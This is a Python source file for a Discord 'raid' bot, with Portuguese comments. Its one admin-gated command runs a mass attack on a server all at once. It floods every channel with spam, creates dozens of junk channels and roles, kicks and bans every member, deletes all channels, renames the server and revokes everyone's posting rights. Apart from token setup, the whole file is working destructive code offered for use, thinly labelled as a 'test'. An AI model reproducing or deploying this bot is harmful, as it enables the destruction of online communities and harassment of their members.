import discord
from discord.ext import commands
import asyncio
import random

TOKEN = 'TOKEN_DO_BOT_EXTREMO'  # Substitua pelo token do bot
PREFIX = '!'

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f'Bot Mega Forte 100x conectado como {bot.user}')

# Função para enviar mensagens em massa em todos os canais
async def raid_all_channels(ctx, quantidade: int, mensagem: str):
    for channel in ctx.guild.text_channels:
        for i in range(quantidade):
            try:
                await channel.send(f"{mensagem} - {i+1}")
                await asyncio.sleep(0.01)  # Intervalo extremamente curto
            except discord.Forbidden:
                print(f"Não foi possível enviar mensagem em {channel}.")

# Função para criar canais em massa (extremamente rápido)
async def create_mass_channels(ctx, quantidade: int, nome: str):
    for i in range(quantidade):
        try:
            await ctx.guild.create_text_channel(f"{nome}-{i+1}")
            await asyncio.sleep(0.01)  # Intervalo extremamente curto
        except discord.Forbidden:
            print("Não foi possível criar canais.")

# Função para criar cargos em massa
async def create_mass_roles(ctx, quantidade: int, nome: str):
    for i in range(quantidade):
        try:
            await ctx.guild.create_role(name=f"{nome}-{i+1}")
            await asyncio.sleep(0.01)  # Intervalo extremamente curto
        except discord.Forbidden:
            print("Não foi possível criar cargos.")

# Função para expulsar membros em massa
async def kick_mass_members(ctx, quantidade: int):
    members = list(ctx.guild.members)
    for i in range(min(quantidade, len(members))):
        try:
            await members[i].kick(reason="Teste de raid Mega Forte 100x")
            print(f"Membro {members[i]} expulso.")
            await asyncio.sleep(0.1)
        except discord.Forbidden:
            print(f"Não foi possível expulsar {members[i]}.")

# Função para banir todos os membros do servidor
async def ban_all_members(ctx):
    members = ctx.guild.members
    for member in members:
        try:
            await member.ban(reason="Teste de raid Mega Forte 100x")
            print(f"Membro {member} banido.")
            await asyncio.sleep(0.1)
        except discord.Forbidden:
            print(f"Não foi possível banir {member}.")

# Função para deletar todos os canais do servidor
async def nuke_all_channels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"Canal {channel} deletado.")
            await asyncio.sleep(0.1)
        except discord.Forbidden:
            print(f"Não foi possível deletar o canal {channel}.")

# Função para alterar o nome e o ícone do servidor
async def change_guild_info(ctx):
    try:
        # Altera o nome do servidor
        await ctx.guild.edit(name="CAOS TOTAL 100x")
        # Altera o ícone do servidor (opcional, precisa de uma URL de imagem)
        # await ctx.guild.edit(icon="URL_DA_IMAGEM_AQUI")
        print("Nome do servidor alterado para 'CAOS TOTAL 100x'.")
    except discord.Forbidden:
        print("Não foi possível alterar o nome ou ícone do servidor.")

# Função para alterar permissões de todos os canais
async def change_channel_permissions(ctx):
    for channel in ctx.guild.text_channels:
        try:
            # Remove permissões de enviar mensagens para @everyone
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
            print(f"Permissões de {channel} alteradas.")
            await asyncio.sleep(0.1)
        except discord.Forbidden:
            print(f"Não foi possível alterar permissões de {channel}.")

# Função para enviar mensagens aleatórias em todos os canais
async def spam_random_messages(ctx):
    messages = [
        "RAID MEGA FORTE 100x!",
        "CAOS TOTAL!",
        "SEU SERVIDOR ESTÁ SENDO DESTRUÍDO!",
        "TESTE DE SEGURANÇA EM ANDAMENTO!",
        "MEGA RAID 100x ATIVADO!"
    ]
    for channel in ctx.guild.text_channels:
        for _ in range(10):  # Envia 10 mensagens aleatórias por canal
            try:
                await channel.send(random.choice(messages))
                await asyncio.sleep(0.01)
            except discord.Forbidden:
                print(f"Não foi possível enviar mensagem em {channel}.")

# Comando "Mega-Raid" para iniciar todas as ações simultaneamente
@bot.command(name="megaraid")  # Nome do comando em minúsculas
async def mega_raid(ctx):
    if ctx.author.guild_permissions.administrator:
        # Inicia todas as tarefas simultaneamente
        await asyncio.gather(
            raid_all_channels(ctx, 100, "RAID MEGA FORTE 100x"),  # Envia 100 mensagens em todos os canais
            create_mass_channels(ctx, 100, "raid-channel"),  # Cria 100 canais
            create_mass_roles(ctx, 50, "RAIDED"),  # Cria 50 cargos
            kick_mass_members(ctx, 100),  # Expulsa 100 membros
            ban_all_members(ctx),  # Bane todos os membros
            nuke_all_channels(ctx),  # Deleta todos os canais
            change_guild_info(ctx),  # Altera o nome do servidor
            change_channel_permissions(ctx),  # Altera permissões de todos os canais
            spam_random_messages(ctx)  # Envia mensagens aleatórias em todos os canais
        )
        await ctx.send("MEGA RAID 100x CONCLUÍDO! CAOS TOTAL ABSOLUTO!")
    else:
        await ctx.send("Você não tem permissão para usar este comando.")

# Iniciar o bot
bot.run(TOKEN)